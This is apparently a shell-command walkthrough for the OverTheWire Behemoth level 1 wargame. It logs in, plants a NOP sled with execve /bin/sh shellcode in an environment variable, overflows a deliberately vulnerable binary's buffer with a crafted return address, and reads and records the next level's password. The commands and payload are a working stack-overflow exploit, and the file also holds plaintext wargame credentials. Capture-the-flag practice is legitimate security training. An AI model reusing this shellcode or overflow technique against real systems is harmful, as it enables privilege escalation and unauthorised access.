sftp -oPort=2221 behemoth1@narnia.labs.overthewire.org
8YpAQCAuKf
get /behemoth/behemoth1
exit

# send the file to the server
sshpass -p '8YpAQCAuKf' scp -P 2221 behemoth/behemoth1/env-ballban.c behemoth1@narnia.labs.overthewire.org:/tmp/env-ballban.c

sshpass -p '8YpAQCAuKf' ssh behemoth1@narnia.labs.overthewire.org -p 2221

cd /tmp
gcc env-ballban.c -o env-ballban -m32

export PYTHONIOENCODING=latin-1
export EGG=$(python3 -c "print('\x90'*5000 + '\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80')")

# get address of EGG
./env-ballban EGG
(python3 -c "print('a' * 71 + '\x4a\xca\xff\xff')";cat) | /behemoth/behemoth1

cat /etc/behemoth_pass/behemoth2
# password: IxPJbQtH8q
